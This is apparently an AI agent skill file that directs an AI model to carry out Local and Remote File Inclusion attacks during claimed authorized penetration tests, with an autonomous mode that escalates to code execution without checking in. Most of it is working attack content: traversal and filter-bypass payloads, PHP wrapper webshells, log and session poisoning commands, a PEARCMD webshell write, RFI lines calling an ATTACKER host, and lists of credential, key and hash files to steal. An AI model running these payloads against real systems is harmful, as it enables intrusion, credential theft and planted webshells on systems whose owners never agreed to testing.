---
name: lfi
description: >
  Guide Local File Inclusion (LFI) and Remote File Inclusion (RFI) exploitation
  during authorized penetration testing. Use when the user has found a parameter
  that includes files (path traversal, PHP include, template loading) and needs to
  read source code, access sensitive files, or escalate to RCE. Also triggers on:
  "LFI", "local file inclusion", "path traversal", "directory traversal",
  "file inclusion", "php://filter", "PHP wrappers", "log poisoning", "RFI",
  "remote file inclusion", "LFI to RCE", "../../../etc/passwd", "file read
  vulnerability", "include vulnerability". OPSEC: low-medium — file reads are
  quiet, but log poisoning and RCE payloads create artifacts. Tools: burpsuite,
  ffuf, php_filter_chain_generator.
  Do NOT use for arbitrary file upload vulnerabilities — use file-upload-bypass
  instead. Do NOT use for XXE-based file read — use xxe instead.
---

# Local File Inclusion / Remote File Inclusion

You are helping a penetration tester exploit file inclusion vulnerabilities. The
target application includes files based on user-controlled input — either locally
(LFI) or from a remote URL (RFI). The goal is to read sensitive files, extract
source code, and escalate to remote code execution. All testing is under explicit
written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each technique. Start with basic traversal, then
  escalate to wrappers and RCE. Ask before attempting log poisoning or writing
  files.
- **Autonomous**: Execute end-to-end. Auto-detect platform, test traversal and
  wrappers, escalate to RCE via the most reliable method. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (traversal
  confirmed, source code read, RCE achieved, pivot to another skill):
  `### [HH:MM] lfi → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `lfi-source-index.php`, `lfi-etc-passwd.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

## Prerequisites

- A parameter that includes or loads files (URL param, POST field, cookie, header)
- Common vulnerable parameters: `?file=`, `?page=`, `?include=`, `?path=`,
  `?doc=`, `?view=`, `?content=`, `?template=`, `?action=`, `?dir=`, `?cat=`,
  `?mod=`, `?conf=`, `?locate=`

## Step 1: Assess

If not already provided, determine:
1. **Platform** — Linux or Windows (try `/etc/passwd` vs `C:\Windows\win.ini`)
2. **Language** — PHP, Java/JSP, Node.js, Python, ASP.NET
3. **Injection point** — which parameter, GET/POST/cookie/header
4. **Base behavior** — does the param expect a filename, path, or URL?

Skip if context was already provided.

## Step 2: Basic Traversal

### Confirm LFI

```
# Linux
../../../etc/passwd
# Windows
..\..\..\Windows\win.ini
..\..\..\..\Windows\win.ini
```

### Filter Bypass

If basic traversal is blocked, try these in order:

```
# URL encoding
..%2f..%2f..%2fetc%2fpasswd

# Double URL encoding (when server decodes twice)
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Non-recursive stripping (server removes ../ once)
....//....//....//etc/passwd
..././..././..././etc/passwd

# UTF-8 overlong encoding
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php

# Path truncation (exhaust 4096-byte limit, PHP < 5.3)
../../../etc/passwd/./././././[repeat to 4096+ chars]

# Mixed separators
..\/..\/..\/etc/passwd

# Backslash encoding
%5C..%5C..%5C..%5Cetc%5Cpasswd
```

### Windows-Specific Bypass

```
# Backslash traversal
..\..\..\..\Windows\win.ini

# UNC path (may trigger SMB)
\\localhost\c$\Windows\win.ini

# FindFirstFile wildcard (matches temp files)
..\..\..\..\Windows\Temp\php<<
```

## Step 3: PHP Wrappers

PHP wrappers are the most powerful LFI technique — they can read source code,
execute arbitrary PHP, and bypass many filters.

### php://filter — Source Code Extraction

Read PHP source without executing it:

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
```

Decode the base64 output to get the source code.

**If base64 is blocked:**

```
# ROT13
php://filter/string.rot13/resource=index.php

# Chained filters
php://filter/zlib.deflate/convert.base64-encode/resource=index.php

# iconv conversion
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Case insensitive (bypass keyword filter)
PhP://FiLtEr/convert.base64-encode/resource=index.php
```

### data:// — Direct Code Execution

Requires `allow_url_include=On` (rare but check):

```
data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

### php://input — POST Body as File

Requires `allow_url_include=On`:

```
# Include php://input, then send PHP code in POST body:
POST /vuln.php?page=php://input HTTP/1.1

<?php system('id'); ?>
```

### expect:// — Direct Command Execution

Requires `expect` extension (rare):

```
expect://id
expect://ls+-la
```

### zip:// and phar:// — Archive Exploitation

Upload a ZIP containing a PHP shell (disguised as allowed extension):

```bash
# Create zip with shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Upload shell.jpg, then include:
zip://uploads/shell.jpg%23shell.php&cmd=id

# phar:// variant
phar://uploads/archive.phar/shell.txt
```

## Step 4: LFI to RCE

When you can read files but need code execution:

### Method 1: PHP Filter Chain RCE (No File Write Required)

The most reliable modern LFI-to-RCE technique. Uses chained `php://filter` iconv
conversions to generate arbitrary PHP code without writing to disk.

```bash
# Install the generator
git clone https://github.com/synacktiv/php_filter_chain_generator

# Generate a webshell chain
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Use the output as the LFI parameter value
# Result is a long php://filter/convert.iconv... chain
```

The generated chain works as a direct include — no file write needed. This works
on any PHP version that supports `php://filter`.

### Method 2: Log Poisoning

Inject PHP into a log file, then include it.

**Apache/Nginx access log:**

```bash
# Poison the User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' 'http://TARGET/'

# Include the log
# Apache: ../../../var/log/apache2/access.log&cmd=id
# Nginx:  ../../../var/log/nginx/access.log&cmd=id
```

**SSH auth log (if SSH is exposed):**

```bash
# Poison with PHP as username
ssh '<?php system($_GET["cmd"]); ?>'@TARGET

# Include: ../../../var/log/auth.log&cmd=id
```

**FTP log:**

```bash
# Login with PHP payload as username
ftp TARGET  # username: <?php system($_GET["cmd"]); ?>

# Include: ../../../var/log/vsftpd.log&cmd=id
```

**Mail log:**

```bash
# Send email with PHP in body
mail -s "<?php system(\$_GET['cmd']); ?>" www-data@TARGET < /dev/null

# Include: ../../../var/log/mail&cmd=id
# Or: ../../../var/spool/mail/www-data&cmd=id
```

### Method 3: PHP Session Poisoning

If you can control data stored in a PHP session:

```
# Set a session value containing PHP code (e.g., via login username)
# Session files are at:
# Linux: /var/lib/php/sessions/sess_[PHPSESSID]
# Or:    /tmp/sess_[PHPSESSID]

# Include the session file:
../../../var/lib/php/sessions/sess_[YOUR_PHPSESSID]&cmd=id
```

### Method 4: /proc/self/environ

If `/proc/self/environ` is readable and contains User-Agent:

```bash
# Set User-Agent to PHP code
curl -A '<?php system($_GET["cmd"]); ?>' \
  'http://TARGET/vuln.php?page=../../../proc/self/environ&cmd=id'
```

### Method 5: PHP_SESSION_UPLOAD_PROGRESS

Works even with `session.auto_start=Off`. Upload a file with
`PHP_SESSION_UPLOAD_PROGRESS` in the form data — PHP writes the filename to the
session file, creating a race condition window.

```bash
# Race condition: upload with PHP code in filename, include session before cleanup
# Session path: /var/lib/php/sessions/sess_[PHPSESSID]
# Requires concurrent requests (threading)
```

Tool: `php_filter_chains_oracle_exploit` for automated exploitation.

### Method 6: PEARCMD.php Gadget

If `pearcmd.php` exists on the server (common in Docker PHP images):

```
# Write a webshell via config-create
?file=/usr/local/lib/php/pearcmd.php&+-config-create+/<?=system($_GET['cmd'])?>+/tmp/shell.php

# Then include the written shell
?file=/tmp/shell.php&cmd=id
```

Alternative PEAR commands: `man_dir`, `download`, `install`.

### Method 7: Temp File + Race Condition

PHP creates temp files during file uploads at `/tmp/phpXXXXXX`. If you can
determine the filename (e.g., via `phpinfo()` output), include it before PHP
deletes it on request completion.

### Method 8: PHAR Deserialization (PHP < 8.0)

If the application calls `file_exists()`, `filesize()`, `md5_file()`, etc. on
the included path, PHAR metadata is auto-deserialized:

```
phar://uploads/evil.phar
```

The PHAR file can have JPG magic bytes (`\xff\xd8\xff`) to bypass upload filters.
Requires a known gadget chain in the application. PHP 8.0+ no longer
auto-deserializes PHAR metadata.

## Step 5: Sensitive Files

### Linux

```
/etc/passwd
/etc/shadow                    # Requires root — try anyway
/etc/hosts
/etc/hostname
/proc/self/environ             # Environment variables (DB creds, API keys)
/proc/self/cmdline             # How the process was started
/proc/version                  # Kernel version
/home/USER/.ssh/id_rsa         # SSH private keys
/home/USER/.bash_history       # Command history
/root/.ssh/id_rsa
/root/.bash_history
```

**Web server configs:**

```
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/var/www/html/.htaccess
```

**Application configs:**

```
/var/www/html/config.php
/var/www/html/.env              # Laravel, Node.js
/var/www/html/wp-config.php     # WordPress
/var/www/html/configuration.php # Joomla
/var/www/html/config/database.yml  # Rails
```

**Logs (for poisoning):**

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/vsftpd.log
/var/log/mail.log
/var/log/syslog
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\config\sam    # Password hashes (requires SYSTEM)
C:\Windows\System32\config\system
C:\Windows\Panther\unattend.xml   # Auto-install creds (plaintext!)
C:\Windows\Panther\Unattend\unattend.xml
C:\sysprep.inf
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\mysql\data\mysql\user.MYD
C:\Windows\System32\inetsrv\config\applicationhost.config
C:\Users\Administrator\.ssh\id_rsa
```

## Step 6: Remote File Inclusion (RFI)

RFI requires `allow_url_include=On` (off by default since PHP 5.2). Test anyway.

```
# Basic RFI
http://ATTACKER/shell.txt

# SMB (Windows — works even with allow_url_fopen=Off)
\\ATTACKER\share\shell.php

# data:// as RFI alternative
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**SMB-based RFI on Windows** is often overlooked — `allow_url_include` doesn't
apply to UNC paths, so this bypasses the restriction.

## Step 7: Escalate or Pivot

- **Got source code**: Extract database credentials, API keys, secrets. Route to
  direct database access or **sql-injection-union** / **sql-injection-error** if
  you find hardcoded queries.
- **Got /etc/passwd**: Enumerate users, check for SSH keys, route to credential
  spraying or **privesc**.
- **Got RCE**: Establish reverse shell, route to privilege escalation.
- **Got cloud credentials** (from env/config): Route to cloud exploitation (AWS
  IMDS, Azure tokens).
- **Found SSRF indicators**: Route to **ssrf** for internal service exploitation.
- **Found deserialization** (PHAR, Java): Route to deserialization skills.

When routing, pass along: platform, language, confirmed traversal depth, working
bypass technique, current mode.

## OPSEC Notes

- File reads via LFI are quiet — minimal log footprint beyond the request itself
- Log poisoning leaves your PHP payload permanently in the log file
- PHP filter chains generate very long URLs that may trigger WAF rules
- `data://` and `php://input` payloads are visible in access logs
- PEARCMD exploitation writes a file to disk — clean up after
- Temp file race conditions generate high request volume
- Cleanup: remove any webshells written via log poisoning or PEARCMD

## Deep Reference

For comprehensive payloads, wordlists, and advanced techniques:

```
Read ~/docs/public-security-references/File Inclusion/README.md
Read ~/docs/public-security-references/File Inclusion/Wrappers.md
Read ~/docs/public-security-references/File Inclusion/LFI-to-RCE.md
Read ~/docs/public-security-references/src/pentesting-web/file-inclusion/README.md
Read ~/docs/public-security-references/src/pentesting-web/file-inclusion/lfi2rce-via-php-filters.md
```

For path wordlists:

```
Read ~/docs/public-security-references/File Inclusion/Intruders/Traversal.txt
Read ~/docs/public-security-references/File Inclusion/Intruders/JHADDIX_LFI.txt
Read ~/docs/public-security-references/File Inclusion/Intruders/Linux-files.txt
Read ~/docs/public-security-references/File Inclusion/Intruders/Windows-files.txt
```

## Troubleshooting

### Traversal Returns Empty / Error

- Try more `../` levels (go deeper than you think — 10+ is common in nested apps)
- Try alternate encoding: `%2e%2e%2f`, `%252e%252e%252f`, `%c0%ae%c0%ae/`
- Check if server strips `../` non-recursively: `....//` or `..././`
- On Windows, try both `/` and `\` separators
- Check if a file extension is appended: use null byte (`%00`) on PHP < 5.3.4
  or path truncation on PHP < 5.3

### php://filter Returns Empty

- Check if `php://` is blacklisted — try `PhP://FiLtEr` (case insensitive)
- Try `php://filter/read=convert.base64-encode/resource=FILE` (explicit `read=`)
- If `base64` is blocked: use `string.rot13` or `convert.iconv.UTF-8.UTF-16`
- Chain with compression: `zlib.deflate/convert.base64-encode`

### Log Poisoning Fails

- Verify the log file path — varies by distro and install method
- Check permissions — log files may not be readable by the web user
- Use a very short payload — large payloads may be truncated
- URL-encode special characters in the User-Agent
- Check if the log rotated since poisoning — try the active log file

### data:// and php://input Don't Work

- `allow_url_include` is likely `Off` (default since PHP 5.2)
- PHP filter chain RCE does NOT require `allow_url_include` — use that instead
- Log poisoning doesn't require it either
- On Windows, try SMB-based RFI (`\\attacker\share\shell.php`)

### LFI Works but No RCE Path

Priority order for escalation:
1. PHP filter chain RCE (most reliable, no file write)
2. Log poisoning (Apache/Nginx access log → SSH auth log → FTP log)
3. Session poisoning (if you control any session data)
4. PEARCMD gadget (if Docker PHP image)
5. /proc/self/environ (if readable)
6. Temp file race condition (last resort, needs threading)

### Automated Tools

```bash
# LFISuite — automated LFI scanner
python lfimap.py -U 'http://TARGET/vuln.php?file=PWN' -a

# php_filter_chain_generator — filter chain RCE
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Kadimus — LFI scanner
kadimus -u 'http://TARGET/vuln.php?page=FILE'

# wrapwrap — file leak with prefix/suffix
python3 wrapwrap.py --parameter file --url 'http://TARGET/vuln.php' \
  --target /etc/passwd
```
